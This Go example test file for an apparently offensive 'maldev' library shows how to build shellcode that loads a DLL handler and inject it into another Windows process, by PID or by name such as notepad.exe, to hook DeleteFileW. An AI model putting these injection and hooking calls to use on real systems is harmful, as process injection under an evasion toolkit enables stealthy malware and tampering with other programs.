//go:build windows

package hook_test

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion/hook"
)

// GoHandler builds shellcode that runs an arbitrary Go DLL handler
// without CGo. Pass the DLL path and the exported entry point name.
func ExampleGoHandler() {
	sc, err := hook.GoHandler(`C:\Users\Public\handler.dll`, "MyHandler")
	if err != nil {
		fmt.Println("build:", err)
		return
	}
	fmt.Printf("shellcode size: %d bytes\n", len(sc))
}

// RemoteInstall installs a hook in a target process by PID. The
// shellcode handler is injected via CreateRemoteThread-class injection
// and triggered when the hooked function is called.
func ExampleRemoteInstall() {
	pid := uint32(1234)
	handler, _ := hook.GoHandler(`C:\handler.dll`, "MyHandler")
	if err := hook.RemoteInstall(pid, "kernel32.dll", "DeleteFileW", handler); err != nil {
		fmt.Println("install:", err)
	}
}

// RemoteInstallByName resolves the target process by image name. Same
// as RemoteInstall but spares the PID lookup.
func ExampleRemoteInstallByName() {
	handler, _ := hook.GoHandler(`C:\handler.dll`, "MyHandler")
	_ = hook.RemoteInstallByName("notepad.exe", "kernel32.dll", "DeleteFileW", handler)
}
